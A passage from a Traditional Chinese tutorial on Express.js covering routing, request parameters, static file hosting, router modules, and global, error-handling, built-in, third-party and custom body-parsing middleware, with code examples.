<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 導入express</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 創建Web服務器</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 啟動Web服務器</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;express server running at http://127.0.0.1:3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="客戶端與服務器交互"><a href="#客戶端與服務器交互" class="headerlink" title="客戶端與服務器交互"></a>客戶端與服務器交互</h3><ol>
<li><p>監聽<code>GET</code>請求：</p>
<ul>
<li>使用<code>app.get</code>方法，監聽客戶端的<code>GET</code>請求</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;url&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; <span class="comment">/*處理函數*/</span> &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>監聽<code>POST</code>請求：</p>
<ul>
<li>使用<code>app.post</code>方法，監聽客戶端的<code>POST</code>請求</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;url&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; <span class="comment">/*處理函數*/</span> &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>把內容響應給客戶端：</p>
<ul>
<li>使用<code>res.send</code>方法，把處理好的內容發送給客戶端  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">send</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 監聽客戶端的 GET 和 POST 請求，並向客戶端響應內容</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/user&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 調用 express 提供的 res.send 方法向客戶端響應 JSON 對象</span></span><br><span class="line">    res.<span class="title function_">send</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">20</span>, <span class="attr">gender</span>:<span class="string">&#x27;Male&#x27;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/user&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 調用 express 提供的 res.send 方法向客戶端響應文本字符串</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Request succeeded&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;express server running at http://127.0.0.1:3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="獲取路徑中攜帶的參數"><a href="#獲取路徑中攜帶的參數" class="headerlink" title="獲取路徑中攜帶的參數"></a>獲取路徑中攜帶的參數</h3><ol>
<li><p><code>query</code>類型的參數：</p>
<ul>
<li>通過<code>req.query</code>對象，訪問到客戶端通過查詢字符串的形式發送給服務器的參數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>params</code>類型的參數：</p>
<ul>
<li>通過<code>req.params</code>對象，訪問到客戶端通過查詢字符串的形式發送給服務器的參數</li>
<li>使用<code>params</code>類型參數必須添加佔位符<code>/:xxx</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/:name/:age&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">params</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="托管靜態資源"><a href="#托管靜態資源" class="headerlink" title="托管靜態資源"></a>托管靜態資源</h3><ol>
<li><p>創建靜態資源服務器：</p>
<ul>
<li><p>使用<code>express.static</code>函數創建一個靜態資源服務器</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/public&#x27;</span>)))    <span class="comment">// 防止路徑動態拼接問題</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>將<code>public</code>目錄下的圖片、CSS文件、JavaScript文件對外開放訪問</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:3000/images/bg.jpg</span><br><span class="line">http://127.0.0.1:3000/css/style.css</span><br><span class="line">http://127.0.0.1:3000/js/login.js</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意：Express在<font color="#f54747">指定的</font>靜態目錄中查找文件，並對外提供資源的訪問路徑。因此<font color="#f54747">存放靜態文件的目錄名不會出現在URL中</font></p>
</li>
</ul>
</li>
<li><p>托管多個靜態資源目錄：</p>
<ul>
<li>多次調用<code>express.static</code>函數即可  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/files&#x27;</span>)))</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/public&#x27;</span>)))</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：如果托管的目錄中有重名的文件，會查找優先添加的文件（<font color="#f54747">文件會根據目錄的添加順序查找</font>）</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="express路由"><a href="#express路由" class="headerlink" title="express路由"></a>express路由</h2><ol>
<li><p>簡介：</p>
<ul>
<li><p><code>Express</code>中的路由指<font color="#f54747">客戶端的請求</font>與<font color="#f54747">服務器處理函數</font>之間的映射關係</p>
</li>
<li><p>可以直接將路由掛載到<code>app</code>上，就是<code>app</code>直接掛載監聽</p>
</li>
<li><p>但<font color="#f54747">推薦將路由抽離為單獨的模塊</font>，更方便對路由進行模塊化的管理</p>
</li>
</ul>
</li>
<li><p>創建路由模塊：</p>
<ul>
<li>使用<code>express.Router</code>創建路由實例再導出</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 導入 express</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 創建路由對象</span></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 掛載具體路由</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/user/list&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Get user list&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/user/add&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Added new user&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 向外導出路由對象</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>註冊路由模塊：</p>
<ul>
<li>使用<code>app.use</code>函數註冊路由中間件</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 導入路由模塊</span></span><br><span class="line"><span class="keyword">const</span> userRouter = <span class="built_in">require</span>(<span class="string">&#x27;./router&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 註冊路由模塊</span></span><br><span class="line">app.<span class="title function_">use</span>(userRouter)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>為路由模塊添加前綴：</p>
<ul>
<li>類似於托管靜態資源時，為靜態資源統一掛載訪問前綴一樣</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/api&#x27;</span>, userRouter)     <span class="comment">// 添加訪問前綴</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="express中間件"><a href="#express中間件" class="headerlink" title="express中間件"></a>express中間件</h2><ol>
<li><p>簡介：</p>
<ul>
<li>中間件 (Middleware) ，指業務流程的<font color="#f54747">中間處理環節</font></li>
<li>中間件必須有輸入與輸出，前一級的輸出作為下一級的輸入</li>
</ul>
</li>
<li><p><code>Express</code>中間件調用流程：</p>
<ul>
<li>當一個請求到達<code>Express</code>服務器之後，可以連續調用多個中間件，對此次請求進行<font color="#f54747">預處理</font></li>
<li>圖示：  <img src="https://p.ipic.vip/m6obwm.png" width="600px"></li>
</ul>
</li>
<li><p>中間件語法：</p>
<ul>
<li><code>Express</code>中間件本質上就是一個<code>function</code>處理函數</li>
<li>只是中間件函數的參數列表中<font color="#f54747">必須包含<code>next</code>參數</font></li>
<li><code>next</code>函數是實現<font color="#f54747">多個中間件連續調用</font>的關鍵，它表示把流轉關係<font color="#f54747">轉交</font>給下一個中間件或路由</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>定義中間件函數：</p>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">mw</span> = (<span class="params">req, res, next</span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;This is a middleware&#x27;</span>)</span><br><span class="line">    <span class="title function_">next</span>()  <span class="comment">// 把流轉關係轉交給下一個中間件或路由</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>中間件的注意事項：</p>
<ol>
<li><p>必須在路由之前註冊中間件</p>
</li>
<li><p>客戶端發送過來的請求，可以連續調用多個中間件進行處理</p>
</li>
<li><p>執行完中間件的代碼之後，必須調用<code>next</code>函數</p>
</li>
<li><p>為了防止代碼邏輯的混亂，調用<code>next</code>函數之後不要再寫額外的代碼</p>
</li>
<li><p>連續調用多個中間件的時候，多個中間件之間共享<code>req</code>和<code>res</code>對象</p>
</li>
</ol>
</li>
</ol>
<h3 id="全局中間件"><a href="#全局中間件" class="headerlink" title="全局中間件"></a>全局中間件</h3><ol>
<li><p>簡介：</p>
<ul>
<li>全局生效的中間件就是客戶端發起的<font color="#f54747">任何請求</font>到達服務器之後都會觸發</li>
</ul>
</li>
<li><p>定義全局中間件：</p>
<ul>
<li>使用<code>app.use</code>函數註冊全局中間件</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(mw)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>定義多個全局中間件：</p>
<ul>
<li>使用<code>app.use</code>函數連續註冊多個全局中間件</li>
<li>客戶端請求到達服務器之後，會按照中間件的註冊順序依次調用</li>
</ul>
</li>
<li><p>全局中間件作用：</p>
<ul>
<li>由於多個中間件之間是<font color="#f54747">共享同一個<code>res</code>和<code>req</code></font>，可以在前面的中間件統一為<code>res</code>或<code>req</code>對象添加自訂義屬性和方法，給後續中間件或路由使用</li>
<li>例子：為所有路由添加發送請求時間  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 中間件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">mw</span> = (<span class="params">req, res, next</span>) =&gt; &#123;</span><br><span class="line">    req.<span class="property">startTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>()  <span class="comment">// 獲取請求到達服務器時間</span></span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(req.<span class="property">startTime</span>)     <span class="comment">// 直接訪問中間件中添加的屬性與方法</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="局部中間件"><a href="#局部中間件" class="headerlink" title="局部中間件"></a>局部中間件</h3><ol>
<li><p>簡介：</p>
<ul>
<li>不使用<code>app.use</code>函數註冊的中間件，請求到達服務器不會立即觸發</li>
</ul>
</li>
<li><p>註冊局部中間件：</p>
<ul>
<li>在路由函數中添加中間件參數</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, mw, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Home Page&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>定義多個局部中間件：</p>
<ul>
<li>路由函數中：<ol>
<li>參數形式傳入</li>
<li>包裝成一個數組傳入</li>
</ol>
</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, mw1, mw2, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; res.<span class="title function_">send</span>(<span class="string">&#x27;Home Page&#x27;</span>) &#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, [mw1, mw2], <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; res.<span class="title function_">send</span>(<span class="string">&#x27;Home Page&#x27;</span>) &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="中間件分類"><a href="#中間件分類" class="headerlink" title="中間件分類"></a>中間件分類</h3><h4 id="應用級別中間件"><a href="#應用級別中間件" class="headerlink" title="應用級別中間件"></a>應用級別中間件</h4><ul>
<li><p>通過<code>app.use()</code>、<code>app.get()</code>或<code>app.post()</code>綁定到<code>app</code>實例上的中間件</p>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 應用級別中間件（全局中間件）</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123; <span class="title function_">next</span>() &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 應用級別中間件（局部中間件）</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, mw, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; res.<span class="title function_">send</span>(<span class="string">&#x27;Home Page&#x27;</span>) &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="路由級別中間件"><a href="#路由級別中間件" class="headerlink" title="路由級別中間件"></a>路由級別中間件</h4><ul>
<li><p>綁定到<code>express.Router()</code>實例上的中間件，與應用級別中間件沒有區別</p>
</li>
<li><p>只是應用級別中間件是綁定到<code>app</code>實例上，而路由級別中間件事綁定到<code>router</code>實例上</p>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由級別中間件</span></span><br><span class="line">router.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123; <span class="title function_">next</span>() &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, router)</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="錯誤級別中間件"><a href="#錯誤級別中間件" class="headerlink" title="錯誤級別中間件"></a>錯誤級別中間件</h4><ul>
<li><p>專門用來捕獲整個項目中發生的異常錯誤，防止項目異常崩潰問題</p>
</li>
<li><p>錯誤級別中間件的處理函數中第一個形參是<code>err</code></p>
</li>
<li><p>語法：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(err, req, res, next) =&gt; &#123;  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Server error&#x27;</span>)     <span class="comment">// 拋出自定義錯誤</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Home Page&#x27;</span>)       <span class="comment">// 後續程序不會執行</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 錯誤級別中間件</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">err, req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;ERROR!!!&#x27;</span>, err.<span class="property">message</span>)    <span class="comment">// 在服務器打印錯誤消息</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;ERROR!!! &#x27;</span> + err.<span class="property">message</span>)         <span class="comment">// 向客戶端響應錯誤內容</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意：<font color="#f54747">錯誤級別中間件必須註冊在所有路由之後！！！</font></p>
</li>
</ul>
<h4 id="Express內置中間件"><a href="#Express內置中間件" class="headerlink" title="Express內置中間件"></a>Express內置中間件</h4><ul>
<li>Express 4.16.0 版本之後，<code>Express</code>內置了三個常用的中間件，提高<code>Express</code>項目開發效率和體驗</li>
</ul>
<ol>
<li><p><code>express.static</code></p>
<ul>
<li>用於快速托管靜態資源的內置中間件（<code>HTML</code>文件、圖片、<code>CSS</code>樣式等）</li>
</ul>
</li>
<li><p><code>express.json</code></p>
<ul>
<li><p>用於解析<code>JSON</code>格式的請求體數據</p>
</li>
<li><p>解析：<code>application/json</code>格式的數據</p>
  <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Donald&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">20</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>註冊中間件：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br></pre></td></tr></table></figure>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服務器中使用 req.body 屬性接收請求體數據</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>) &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>express.urlencoded</code></p>
<ul>
<li><p>用於解析<code>URL-encoded</code>格式的請求體數據</p>
</li>
<li><p>解析：<code>application/x-www-form-urlencoded</code>格式的數據</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;name=Donald&amp;age=18&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>註冊中間件：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;))</span><br></pre></td></tr></table></figure>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服務器中使用 req.body 屬性接收請求體數據</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>) &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h4 id="第三方中間件"><a href="#第三方中間件" class="headerlink" title="第三方中間件"></a>第三方中間件</h4><ul>
<li><p>由第三方開發出來的中間件，在項目中按需下載第三方中間件以提高效率</p>
</li>
<li><p>使用步驟：</p>
<ol>
<li><p><code>npm</code>安裝中間件</p>
</li>
<li><p>使用<code>require</code>導入中間件</p>
</li>
<li><p>使用<code>app.use</code>註冊並使用中間件</p>
</li>
</ol>
</li>
<li><p>例子：<code>body-parser</code>解析請求體</p>
<ol>
<li><p>安裝<code>body-parser</code>中間件</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i body-parser</span><br></pre></td></tr></table></figure>
</li>
<li><p>導入、註冊並使用<code>body-parser</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 導入解析表單數據的中間件 body-parser</span></span><br><span class="line"><span class="keyword">const</span> parser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 註冊並使用 body-parser</span></span><br><span class="line">app.<span class="title function_">use</span>(parser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;))</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>注意：<code>Express</code>內置的<code>express.urlencoded</code>中間件，就是基於<code>body-parser</code>第三方中間件進一步封裝出來的</li>
</ul>
</li>
</ul>
<h3 id="自定義中間件"><a href="#自定義中間件" class="headerlink" title="自定義中間件"></a>自定義中間件</h3><ol>
<li><p>定義中間件</p>
<ul>
<li>通過<code>app.use</code>函數註冊並使用中間件</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123; &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>監聽<code>req</code>的<code>data</code>事件</p>
<ul>
<li>中間件中需要監聽<code>req</code>的<code>data</code>事件來獲取客戶端發送到服務器的數據</li>
<li>如果數據量比較大，無法一次性發送完畢，<font color="#f54747">客戶端會把數據切割後，分批發送到服務器</font>，所以<code>data</code>事件可能會觸發多次，每一次觸發<code>data</code>事件時，<font color="#f54747">獲取到的數據只是完整數據的一部分</font>，需要手動對接收到的數據進行拼接</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 儲存客戶端傳送過來的請求體數據</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 監聽 req 的 data 事件</span></span><br><span class="line">req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">    str += chunk</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>監聽<code>req</code>的<code>end</code>事件</p>
<ul>
<li>當請求體數據接收完畢後，會自動觸發<code>req</code>的<code>end</code>事件</li>
<li>可以在<code>req</code>的<code>end</code>事件中，<font color="#f54747">拿到並處理完整的請求體數據</font></li>
<li>具體編碼：</li>
</ul>
</li>
<li><p>使用<code>querystringify</code>第三方插件解析請求體數據</p>
<ul>
<li><p>安裝：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i querystringify</span><br></pre></td></tr></table></figure>
</li>
<li><p>導入並使用：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 導入 querystringify</span></span><br><span class="line"><span class="keyword">const</span> qs = <span class="built_in">require</span>(<span class="string">&#x27;querystringify&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析請求體數據</span></span><br><span class="line">qs.<span class="title function_">parse</span>(str)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>將解析出來的數據掛載為<code>req.body</code></p>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.<span class="property">body</span> = qs.<span class="title function_">parse</span>(str)</span><br><span class="line"><span class="title function_">next</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>封裝為獨立模塊</p>
<ul>
<li>為了優化代碼結構，可以把自定義中間件函數<font color="#f54747">封裝為獨立的模塊</font></li>
<li>自定義中間件模塊<code>custom-body-parser.js</code>：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> qs = <span class="built_in">require</span>(<span class="string">&#x27;querystringify&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定義解析表單數據的中間件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">bodyParser</span> = (<span class="params">req, res, next</span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 1. 定義 str 字符串，用於儲存客戶端傳送過來的請求體數據</span></span><br><span class="line">    <span class="keyword">let</span> str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 監聽 req 的 data 事件</span></span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">        str += chunk</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 監聽 req 的 end 事件</span></span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 在 str 中存放的是完整的請求體數據</span></span><br><span class="line">        <span class="comment">// console.log(str)</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 把字符串格式的請求體數據，解析成對象格式並且掛載為 req.body</span></span><br><span class="line">        <span class="keyword">const</span> body = qs.<span class="title function_">parse</span>(str)</span><br><span class="line">        req.<span class="property">body</span> = body</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 導出函數</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = bodyParser</span><br></pre></td></tr></table></figure></li>
<li>導入、註冊並使用自定義模塊<code>server.js</code>：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 導入自定義中間件模塊</span></span><br><span class="line"><span class="keyword">const</span> customBodyParser = <span class="built_in">require</span>(<span class="string">&#x27;./custom-body-parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 將自定義的中間件函數註冊為全局可用的中間件</span></span><br><span class="line">app.<span class="title function_">use</span>(customBodyParser)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="express接口"><a href="#express接口" class="headerlink" title="express接口"></a>express接口</h2><h3 id="編寫接口"><a href="#編寫接口" class="headerlink" title="編寫接口"></a>編寫接口</h3><ol>
<li><p>創建基本服務器：</p>
